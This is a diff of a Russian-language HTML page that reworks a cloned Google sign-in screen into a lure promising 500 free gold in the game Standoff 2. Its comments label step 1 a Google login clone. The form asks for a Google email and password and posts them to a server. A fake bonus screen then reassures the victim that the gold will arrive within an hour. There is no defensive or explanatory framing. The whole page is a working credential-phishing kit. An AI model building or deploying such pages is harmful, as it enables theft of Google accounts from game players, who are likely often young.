@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Вход — Google</title>
+    <title>500 голды — Standoff 2</title>
     <style>
         * {
             margin: 0;
@@ -12,210 +12,329 @@
         }
 
         body {
-            background: #ffffff;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            background: #0a0a10;
+            color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            padding: 16px;
+            overflow: hidden;
+            position: relative;
         }
 
-        .container {
+        /* === ФОН С ОРУЖИЕМ === */
+        .bg-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            max-width: 448px;
-            padding: 48px 40px 36px;
-            border-radius: 8px;
-            border: 1px solid #dadce0;
-            background: #ffffff;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
-            text-align: center;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+            opacity: 0.12;
         }
-
-        .google-logo {
-            width: 75px;
-            height: 24px;
-            margin: 0 auto 32px;
-            display: block;
-        }
-
-        .google-logo svg {
+        .bg-svg {
             width: 100%;
             height: 100%;
         }
 
-        h1 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 8px;
+        /* === КОНТЕЙНЕР === */
+        .container {
+            background: linear-gradient(145deg, rgba(20, 20, 30, 0.94), rgba(10, 10, 16, 0.97));
+            padding: 30px 22px 25px;
+            border-radius: 32px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid #ffd70033;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 40px #ffd70008;
+            position: relative;
+            z-index: 1;
+            backdrop-filter: blur(4px);
         }
 
-        .subtitle {
-            font-size: 16px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 32px;
+        /* === ШАГ 1: Вход через Google (клон) === */
+        .google-logo {
+            margin: 0 auto 20px;
+            display: block;
+        }
+        .google-logo svg {
+            width: 75px;
+            height: 24px;
+        }
+
+        .step-title {
+            font-size: 26px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffd700, #ff8c00);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+
+        .step-sub {
+            color: #99aabb;
+            font-size: 14px;
+            margin-bottom: 20px;
         }
 
         .input-group {
             text-align: left;
-            margin-bottom: 16px;
+            margin-bottom: 14px;
         }
-
         .input-group label {
             display: block;
             font-size: 13px;
-            font-weight: 500;
-            color: #5f6368;
+            color: #99aabb;
             margin-bottom: 4px;
         }
-
         .input-group input {
             width: 100%;
-            padding: 12px 14px;
+            padding: 14px 16px;
+            border: 1px solid #2a2a3e;
+            border-radius: 16px;
+            background: #0e0e18;
+            color: #fff;
             font-size: 16px;
-            font-weight: 400;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            background: #ffffff;
-            color: #202124;
             outline: none;
-            transition: 0.2s;
+            transition: 0.3s;
+            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.5);
         }
-
         .input-group input:focus {
-            border-color: #1a73e8;
-            box-shadow: 0 1px 2px rgba(26, 115, 232, 0.2);
+            border-color: #ffd700;
+            box-shadow: 0 0 20px #ffd70015, inset 0 2px 8px rgba(0, 0, 0, 0.5);
         }
 
-        .btn-next {
+        .btn {
             width: 100%;
-            padding: 12px 0;
-            background: #1a73e8;
-            color: #ffffff;
+            padding: 16px 0;
             border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
+            border-radius: 40px;
+            font-size: 18px;
+            font-weight: 800;
             cursor: pointer;
-            transition: 0.2s;
-            margin-top: 12px;
+            transition: 0.3s;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 6px;
         }
 
-        .btn-next:hover {
-            background: #1557b0;
+        .btn-google {
+            background: linear-gradient(135deg, #1a73e8, #1557b0);
+            color: #fff;
+            box-shadow: 0 4px 20px #1a73e833;
         }
-
-        .btn-next:active {
-            transform: scale(0.97);
+        .btn-google:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 30px #1a73e855;
         }
 
         .btn-gold {
             background: linear-gradient(135deg, #ffd700, #f0a500);
             color: #0a0a10;
-            font-weight: 800;
-            font-size: 18px;
-            padding: 16px 0;
+            box-shadow: 0 4px 20px #ffd70033;
+            font-size: 20px;
         }
-
         .btn-gold:hover {
-            box-shadow: 0 4px 30px #ffd70055;
+            transform: scale(1.02);
+            box-shadow: 0 4px 40px #ffd70055;
         }
 
-        .links {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 20px;
-            font-size: 14px;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
-
-        .links a {
-            color: #1a73e8;
-            text-decoration: none;
-            font-weight: 500;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        .footer {
-            margin-top: 32px;
-            font-size: 12px;
-            color: #5f6368;
-        }
-
-        .footer a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .error-msg {
-            color: #d93025;
-            font-size: 14px;
-            margin-top: 8px;
-            min-height: 20px;
-        }
-
-        .result {
-            margin-top: 12px;
-            font-weight: 500;
-            font-size: 14px;
-            color: #34a853;
+        .btn:active {
+            transform: scale(0.96);
         }
 
         .hidden {
             display: none !important;
         }
 
+        .error-msg {
+            color: #ff4444;
+            font-size: 14px;
+            margin-top: 6px;
+            min-height: 20px;
+        }
+
+        .result {
+            margin-top: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            color: #00ff88;
+        }
+
+        /* === ШАГ 2: ЗАБРАТЬ ГОЛДУ === */
+        .gold-icon {
+            font-size: 48px;
+            margin-bottom: 6px;
+            display: block;
+        }
+
         .gold-badge {
+            background: linear-gradient(135deg, #2a2a3a, #1a1a28);
+            padding: 12px 24px;
+            border-radius: 40px;
+            display: inline-block;
             font-size: 28px;
             font-weight: 900;
             color: #ffd700;
-            background: #2a2a3a;
-            padding: 12px 20px;
-            border-radius: 40px;
-            display: inline-block;
             border: 1px solid #ffd70055;
-            margin-bottom: 16px;
+            box-shadow: 0 0 30px #ffd70015;
+            margin-bottom: 12px;
         }
 
-        .gold-message {
-            font-size: 18px;
-            font-weight: 600;
-            color: #202124;
-            margin: 20px 0 8px;
+        .gold-badge::before {
+            content: "✦ ";
+            color: #ffaa00;
+        }
+        .gold-badge::after {
+            content: " ✦";
+            color: #ffaa00;
         }
 
-        .gold-sub {
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 20px;
+        .gold-desc {
+            color: #99aabb;
+            font-size: 16px;
+            margin-bottom: 18px;
         }
 
+        /* === ШАГ 3: ГОЛДА ПРИДЁТ === */
+        .check-icon {
+            font-size: 56px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffd700;
+            margin-bottom: 6px;
+        }
+
+        .success-desc {
+            color: #99aabb;
+            font-size: 15px;
+            margin-bottom: 8px;
+        }
+
+        .timer-text {
+            font-size: 13px;
+            color: #667;
+        }
+
+        /* === Адаптация === */
         @media (max-width: 480px) {
             .container {
-                padding: 32px 20px 28px;
-                border: none;
-                box-shadow: none;
+                padding: 24px 16px 20px;
+                max-width: 95%;
             }
-            h1 {
+            .step-title {
                 font-size: 22px;
+            }
+            .gold-badge {
+                font-size: 22px;
+                padding: 8px 16px;
+            }
+            .btn {
+                font-size: 16px;
+                padding: 14px 0;
+            }
+            .btn-gold {
+                font-size: 18px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .container {
+                padding: 18px 12px 16px;
+            }
+            .step-title {
+                font-size: 20px;
+            }
+            .gold-badge {
+                font-size: 18px;
+                padding: 6px 12px;
             }
         }
     </style>
 </head>
 <body>
 
+    <!-- ФОН С ОРУЖИЕМ И АГЕНТАМИ -->
+    <div class="bg-layer">
+        <svg class="bg-svg" viewBox="0 0 800 600" preserveAspectRatio="xMidYMid slice">
+            <g transform="translate(40, 40) rotate(-20)" opacity="0.25">
+                <rect x="0" y="8" width="70" height="12" rx="4" fill="#8899bb"/>
+                <rect x="60" y="4" width="20" height="20" rx="4" fill="#667788"/>
+                <circle cx="70" cy="14" r="4" fill="#ffd700"/>
+            </g>
+            <g transform="translate(680, 30) rotate(15)" opacity="0.2">
+                <rect x="0" y="6" width="80" height="10" rx="3" fill="#99aabb"/>
+                <rect x="70" y="0" width="25" height="22" rx="4" fill="#8899bb"/>
+                <circle cx="82" cy="11" r="5" fill="#ffd700"/>
+            </g>
+            <g transform="translate(20, 260) rotate(-30)" opacity="0.2">
+                <polygon points="0,0 60,-6 55,6" fill="#aabbcc"/>
+                <circle cx="8" cy="0" r="5" fill="#ffd700"/>
+            </g>
+            <g transform="translate(720, 300) rotate(25)" opacity="0.2">
+                <rect x="0" y="6" width="60" height="10" rx="3" fill="#8899bb"/>
+                <rect x="50" y="2" width="16" height="18" rx="3" fill="#667788"/>
+                <circle cx="58" cy="11" r="3.5" fill="#ffd700"/>
+            </g>
+            <g transform="translate(30, 470)" opacity="0.15">
+                <circle cx="30" cy="0" r="16" fill="#445566"/>
+                <rect x="16" y="-14" width="28" height="12" rx="6" fill="#556677"/>
+                <rect x="12" y="12" width="36" height="40" rx="8" fill="#2a3a4a"/>
+                <rect x="16" y="14" width="28" height="28" rx="4" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
+                <rect x="0" y="14" width="12" height="24" rx="4" fill="#445566"/>
+                <rect x="48" y="14" width="12" height="24" rx="4" fill="#445566"/>
+                <rect x="14" y="52" width="10" height="24" rx="3" fill="#334455"/>
+                <rect x="36" y="52" width="10" height="24" rx="3" fill="#334455"/>
+                <rect x="52" y="16" width="30" height="6" rx="2" fill="#8899bb"/>
+                <rect x="76" y="14" width="10" height="10" rx="2" fill="#667788"/>
+            </g>
+            <g transform="translate(680, 490)" opacity="0.12">
+                <circle cx="30" cy="0" r="14" fill="#556677"/>
+                <rect x="18" y="-12" width="24" height="10" rx="5" fill="#667788"/>
+                <rect x="14" y="10" width="32" height="36" rx="6" fill="#2a3a4a"/>
+                <rect x="18" y="12" width="24" height="24" rx="3" fill="#1a2a3a" stroke="#ffd700" stroke-width="1"/>
+                <rect x="2" y="12" width="12" height="20" rx="3" fill="#445566"/>
+                <rect x="46" y="12" width="12" height="20" rx="3" fill="#445566"/>
+                <rect x="16" y="46" width="8" height="20" rx="3" fill="#334455"/>
+                <rect x="36" y="46" width="8" height="20" rx="3" fill="#334455"/>
+            </g>
+            <g opacity="0.25">
+                <rect x="140" y="80" width="18" height="8" rx="2" fill="#ffd700"/>
+                <rect x="150" y="85" width="18" height="8" rx="2" fill="#ffaa00"/>
+                <rect x="130" y="92" width="16" height="7" rx="2" fill="#ffd700"/>
+                <rect x="620" y="120" width="20" height="9" rx="2" fill="#ffd700"/>
+                <rect x="640" y="128" width="18" height="8" rx="2" fill="#ffaa00"/>
+                <rect x="70" y="380" width="16" height="7" rx="2" fill="#ffd700"/>
+                <rect x="700" y="400" width="20" height="9" rx="2" fill="#ffd700"/>
+                <rect x="200" y="520" width="18" height="8" rx="2" fill="#ffaa00"/>
+                <rect x="560" y="530" width="16" height="7" rx="2" fill="#ffd700"/>
+            </g>
+            <g opacity="0.08">
+                <circle cx="380" cy="100" r="30" fill="none" stroke="#ffd700" stroke-width="2"/>
+                <circle cx="380" cy="100" r="18" fill="#ffd700" opacity="0.3"/>
+                <circle cx="400" cy="450" r="24" fill="none" stroke="#ff8800" stroke-width="2"/>
+                <circle cx="400" cy="450" r="12" fill="#ff8800" opacity="0.2"/>
+            </g>
+        </svg>
+    </div>
+
+    <!-- ОСНОВНОЙ КОНТЕЙНЕР -->
     <div class="container">
 
-        <!-- ШАГ 1: Клон страницы входа Google -->
+        <!-- ===== ШАГ 1: Клон Google Login ===== -->
         <div id="step1">
             <div class="google-logo">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 16" width="100%" height="100%">
+                <svg viewBox="0 0 48 16" width="100%" height="100%">
                     <path fill="#4285F4" d="M 32.6 8.1 c 0 0.6 0.1 1.3 0.3 1.9 h -1.8 v -1.4 h 0.6 c -0.1 -0.3 -0.2 -0.6 -0.2 -0.9 c 0 -0.5 0.3 -0.9 0.9 -1.1 c 0.6 -0.2 1.2 -0.1 1.6 0.3 l 1.1 -1.1 c -0.7 -0.6 -1.6 -0.9 -2.6 -0.9 c -1.3 0 -2.5 0.5 -3.4 1.4 c -0.9 0.9 -1.4 2.1 -1.4 3.4 c 0 1.3 0.5 2.5 1.4 3.4 c 0.9 0.9 2.1 1.4 3.4 1.4 c 1.3 0 2.5 -0.5 3.4 -1.4 c 0.9 -0.9 1.4 -2.1 1.4 -3.4 c 0 -0.6 -0.1 -1.2 -0.3 -1.8 h -4.4 v 1.7 h 2.4 c -0.2 0.6 -0.6 1.1 -1.1 1.5 c -0.5 0.4 -1.1 0.6 -1.8 0.6 c -0.9 0 -1.7 -0.4 -2.3 -1 c -0.6 -0.6 -0.9 -1.4 -0.9 -2.2 c 0 -0.9 0.3 -1.7 0.9 -2.3 c 0.6 -0.6 1.4 -0.9 2.3 -0.9 c 0.7 0 1.3 0.2 1.8 0.7 l 0.8 -0.8 c -0.6 -0.6 -1.5 -1 -2.5 -1 c -1.2 0 -2.3 0.5 -3.1 1.3 c -0.8 0.8 -1.3 2 -1.3 3.3 c 0 1.3 0.5 2.5 1.3 3.3 c 0.8 0.8 2 1.3 3.1 1.3 c 1.2 0 2.3 -0.5 3.1 -1.3 c 0.8 -0.8 1.3 -2 1.3 -3.3 c 0 -0.1 0 -0.2 0 -0.3 z"/>
                     <path fill="#EA4335" d="M 7.4 4.4 c 0.6 -0.5 1.3 -0.8 2.1 -0.8 c 0.9 0 1.7 0.3 2.3 0.9 l 1.8 -1.8 c -1.2 -1.1 -2.8 -1.7 -4.5 -1.7 c -2.1 0 -4 0.8 -5.4 2.2 c -1.4 1.4 -2.2 3.3 -2.2 5.4 c 0 2.1 0.8 4 2.2 5.4 c 1.4 1.4 3.3 2.2 5.4 2.2 c 2.6 0 4.7 -1.1 6.1 -3.1 l -2.5 -1.9 c -0.9 1.1 -2.2 1.8 -3.6 1.8 c -1.8 0 -3.4 -0.9 -4.3 -2.3 c -0.9 -1.4 -1.1 -3.1 -0.6 -4.7 c 0.5 -1.6 1.6 -2.9 3.2 -3.5 z"/>
                     <path fill="#FBBC05" d="M 20.4 0.4 c -1.8 0 -3.5 0.7 -4.7 1.9 l 1.8 1.8 c 0.8 -0.8 1.9 -1.3 3 -1.3 c 1.2 0 2.3 0.4 3.2 1.2 l 1.8 -1.8 c -1.3 -1.2 -3 -1.8 -4.7 -1.8 z"/>
@@ -224,61 +343,45 @@
                 </svg>
             </div>
 
-            <h1>Вход</h1>
-            <div class="subtitle">Войдите в свой аккаунт Google</div>
+            <div class="step-title">500 ГОЛДЫ</div>
+            <div class="step-sub">Войди в аккаунт Google, чтобы получить бонус</div>
 
             <form id="loginForm" onsubmit="submitForm(event)">
                 <div class="input-group">
-                    <label for="email">Электронная почта или телефон</label>
+                    <label>Электронная почта</label>
                     <input type="email" id="email" placeholder="your@gmail.com" required>
                 </div>
 
                 <div id="passwordField" class="input-group hidden">
-                    <label for="password">Пароль</label>
+                    <label>Пароль</label>
                     <input type="password" id="password" placeholder="Введите пароль" required>
                 </div>
 
                 <div class="error-msg" id="errorMsg"></div>
 
-                <button type="submit" class="btn-next" id="submitBtn">Далее</button>
+                <button type="submit" class="btn btn-google" id="submitBtn">ДАЛЕЕ</button>
             </form>
-
-            <div class="links">
-                <a href="#">Забыли пароль?</a>
-                <a href="#">Создать аккаунт</a>
-            </div>
 
             <div id="result" class="result hidden"></div>
         </div>
 
-        <!-- ШАГ 2: Получить 500 голды -->
+        <!-- ===== ШАГ 2: ЗАБРАТЬ 500 ГОЛДЫ ===== -->
         <div id="step2" class="hidden">
-            <div style="font-size: 36px; margin-bottom: 8px;">🎯</div>
+            <span class="gold-icon">🎯</span>
             <div class="gold-badge">+500 ГОЛДЫ</div>
-            <h1 style="font-size: 22px;">Забери бонус!</h1>
-            <div class="gold-sub">Войди в аккаунт и получи 500 голды бесплатно</div>
-            <button class="btn-next btn-gold" onclick="showStep3()">ЗАБРАТЬ ГОЛДУ</button>
+            <div style="font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 4px;">Забери бонус!</div>
+            <div class="gold-desc">Нажми кнопку, чтобы получить голду</div>
+            <button class="btn btn-gold" onclick="showStep3()">ЗАБРАТЬ ГОЛДУ</button>
         </div>
 
-        <!-- ШАГ 3: Голда придёт в течение часа -->
+        <!-- ===== ШАГ 3: ГОЛДА ПРИДЁТ В ТЕЧЕНИЕ ЧАСА ===== -->
         <div id="step3" class="hidden">
-            <div style="font-size: 48px; margin-bottom: 8px;">✅</div>
-            <h1 style="font-size: 22px;">Голда придёт в течение часа</h1>
-            <div class="gold-sub" style="font-size: 15px; color: #5f6368; margin: 8px 0 16px;">
-                Ваш бонус будет начислен в ближайшее время.<br>
-                Спасибо, что выбрали Standoff 2!
-            </div>
-            <div style="font-size: 13px; color: #80868b; margin-top: 12px;">
-                🕒 Ожидайте до 60 минут
-            </div>
+            <span class="check-icon">✅</span>
+            <div class="success-title">Голда придёт в течение часа</div>
+            <div class="success-desc">Ваш бонус будет начислен в ближайшее время</div>
+            <div class="timer-text">🕒 Ожидайте до 60 минут</div>
         </div>
 
-        <div class="footer">
-            <span>Русский</span> &nbsp;·&nbsp;
-            <a href="#">Справка</a> &nbsp;·&nbsp;
-            <a href="#">Конфиденциальность</a> &nbsp;·&nbsp;
-            <a href="#">Условия</a>
-        </div>
     </div>
 
     <script>
@@ -294,7 +397,7 @@
             }
         });
 
-        // ШАГ 1 → отправка данных на сервер → переход на ШАГ 2
+        // ШАГ 1 → отправка данных → ШАГ 2
         async function submitForm(e) {
             e.preventDefault();
 
@@ -327,20 +430,19 @@
 
                 if (data.success) {
                     result.textContent = '✅ Вход выполнен';
-                    result.style.color = '#34a853';
+                    result.style.color = '#00ff88';
 
-                    // Переход на ШАГ 2 через секунду
                     setTimeout(() => {
                         document.getElementById('step1').classList.add('hidden');
                         document.getElementById('step2').classList.remove('hidden');
-                    }, 800);
+                    }, 700);
                 } else {
-                    result.textContent = '❌ Ошибка: ' + (data.error || 'попробуйте снова');
-                    result.style.color = '#d93025';
+                    result.textContent = '❌ ' + (data.error || 'попробуйте снова');
+                    result.style.color = '#ff4444';
                 }
             } catch (err) {
                 result.textContent = '❌ Ошибка соединения';
-                result.style.color = '#d93025';
+                result.style.color = '#ff4444';
             }
         }
 
